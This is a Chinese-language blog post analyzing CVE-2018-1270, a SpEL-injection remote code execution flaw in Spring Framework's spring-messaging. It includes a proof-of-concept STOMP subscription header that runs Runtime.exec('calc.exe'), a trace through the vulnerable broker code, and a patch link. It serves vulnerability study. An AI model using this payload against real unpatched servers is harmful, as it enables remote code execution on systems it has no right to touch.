<!DOCTYPE html>
<html lang="zh_cn">

<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="chrome=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<meta name="description" content="一个孤独散步者的梦">


<meta property="twitter:title" content="CVE-2018-1270 spring-messaging Remote Code Execution 分析">

    <meta property="twitter:card" content="summary">

<meta property="twitter:description" content="">

<title>


     诗与胡说 - CVE-2018-1270 spring-messaging Remote Code Execution 分析 

</title>
<link rel="canonical" href="https://kylingit.com/blog/cve-2018-1270-spring-messaging-remote-code-execution-%E5%88%86%E6%9E%90/">


<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">


  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">



  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">





<link rel="shortcut icon"

    href="https://kylingit.com/img/favicon.png"

>




</head>


<body>


<section class="header">

    <div class="container">
        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
        <div class="content">
            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
            <nav>
                <ul>
                    
                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
                    
                    
                        
                    
                        
                            
                            <a href="https://kylingit.com/about"><li>about</li></a>
                            
                        
                    
                        
                            
                        
                    
                        
                            
                            <a href="https://kylingit.com/projects"><li>projects</li></a>
                            
                        
                    
                    
                        
                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
                        
                    
                        
                    
                </ul>
            </nav>
        </div>
    </div>
</section>


<section class="main post non-narrow zero-top-spacing">
    <div class="container">
        <div class="content">
            <div class="front-matter">
                <div class="title-container">
                    <div class="page-heading">

    CVE-2018-1270 spring-messaging Remote Code Execution 分析

</div>

                </div>
                <div class="meta">
                    <div class="date" title="Wed Apr 11 2018 11:07:18 UTC">Apr 11, 2018</div>
                    <div class="reading-time"><div class="middot"></div>1 minute read</div>
                </div>
            </div>
            <div class="markdown">
                
    
    

<h4 id="0x01-概述">0x01 概述</h4>

<p><a href="https://pivotal.io/security/cve-2018-1270">CVE-2018-1270: Remote Code Execution with spring-messaging</a></p>

<h4 id="0x02-影响版本">0x02 影响版本</h4>

<ul>
<li>Spring Framework 5.0 to 5.0.4</li>
<li>Spring Framework 4.3 to 4.3.15</li>
<li>Older unsupported versions are also affected</li>
</ul>

<h4 id="0x03-环境搭建">0x03 环境搭建</h4>

<pre><code>git clone https://github.com/spring-guides/gs-messaging-stomp-websocket
git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3
</code></pre>

<h4 id="0x04-漏洞利用">0x04 漏洞利用</h4>

<p>在app.js中增加一个header头</p>

<pre><code class="language-js">function connect() {
    var header  = {&quot;selector&quot;:&quot;T(java.lang.Runtime).getRuntime().exec('calc.exe')&quot;};
    var socket = new SockJS('/gs-guide-websocket');
    stompClient = Stomp.over(socket);
    stompClient.connect({}, function (frame) {
        setConnected(true);
        console.log('Connected: ' + frame);
        stompClient.subscribe('/topic/greetings', function (greeting) {
            showGreeting(JSON.parse(greeting.body).content);
        }, header);
    });
}
</code></pre>

<p>spring-boot:run运行，connect建立连接后，点击发送触发漏洞</p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/kVdWA" alt="clac" /></p>

<h4 id="0x05-漏洞分析">0x05 漏洞分析</h4>

<p>在点击发送消息后，spring-message会对消息头部进行处理，相关方法在<code>org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java</code>
<code>addSubscriptionInternal()</code></p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/tvQk8" alt="selector" />
通过<code>sessionId</code>和<code>subsId</code>确定一个<code>selector</code>属性，后续服务端就通过这个<code>subsId</code>来查找特定会话，也就是从<code>headers</code>头部信息查找<code>selector</code>，由<code>selector</code>的值作为expression被执行</p>

<p>点击Send后，<code>org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java</code>接收到message，message的headers头部信息包含了selector的属性，message传进<code>this.subscriptionRegistry.findSubscriptions</code>，由<code>findSubscriptions()</code>进行处理</p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/NUWfs" alt="sendMessageToSubscribers" /></p>

<p>跟进相关方法
<code>org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java</code></p>

<pre><code class="language-java">@Override
protected MultiValueMap&lt;String, String&gt; findSubscriptionsInternal(String destination, Message&lt;?&gt; message) {
	MultiValueMap&lt;String, String&gt; result = this.destinationCache.getSubscriptions(destination, message);
	return filterSubscriptions(result, message);
}
</code></pre>

<p>result的值作为<code>filterSubscriptions()</code>的<code>allMatches</code>参数传入，遍历出<code>sessionId</code>和<code>subsId</code>，此时的result为</p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1AvIp" alt="result" />
跟进<code>filterSubscriptions()</code></p>

<p>经过两层for循环，id为<code>sub-0</code>的subscription被赋值给<code>sub</code>(P.S. 此图是后来补的，故sessionId不一样)</p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/wHSXE" alt="for" />
<img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/QY3Ep" alt="sub" />
通过<code>sub.getSelectorExpression()</code>得到<code>expression</code>的值，此时的<code>expression</code>就包含着我们发送的表达式</p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/zwRxS" alt="expression" /></p>

<p>再往下，执行到<code>expression.getValue()</code>，SpEL得到执行，触发poc</p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/vJ027" alt="calc" /></p>

<h4 id="0x06-补丁">0x06 补丁</h4>

<p><a href="https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a">https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a</a></p>

<h4 id="0x07-参考">0x07 参考</h4>

<ul>
<li><a href="https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/">https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/</a></li>
<li><a href="http://blog.nsfocus.net/spring-messaging-analysis/">http://blog.nsfocus.net/spring-messaging-analysis/</a></li>
<li><a href="https://www.anquanke.com/post/id/104140">https://www.anquanke.com/post/id/104140</a></li>
</ul>


                <br>
                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
            </div>
            <br>
            <div class="disqus">
                <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'kylingit';
    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/cve-2018-1270-spring-messaging-remote-code-execution-%E5%88%86%E6%9E%90\/';
    var disqus_title = 'CVE-2018-1270 spring-messaging Remote Code Execution 分析';
    var disqus_url = 'https:\/\/kylingit.com\/blog\/cve-2018-1270-spring-messaging-remote-code-execution-%E5%88%86%E6%9E%90\/';

    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
            </div>
        </div>
    </div>
</section>

<section class="footer">
    <div class="container">
        <div class="copyright">

        
            <a href="https://kylingit.com/license">Copyright © 2019 kylinking</a>
        

        </div>
        <div class="icons">

        
            <a href="https://github.com/kylingit" target="_blank">
                <i class="icon ion-social-github" title="github"></i>
            </a>
        

        

        

        
            <a href="mailto:ikylinking@gmail.com">
                <i class="icon ion-ios-email larger" title="email"></i>
            </a>
        

        
            <a href="https://kylingit.com/index.xml">
                <i class="icon ion-social-rss larger" title="rss"></i>
            </a>
        

        </div>
    </div>
</section>


  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
  



  <script src="https://kylingit.com/js/progressively.min.js" defer></script>


<script>
  window.onload = function() {
    
      hljs.initHighlighting();
    
    
      progressively.init({delay: 30, throttle: 50});
    
  };
</script>

</body>
</html>

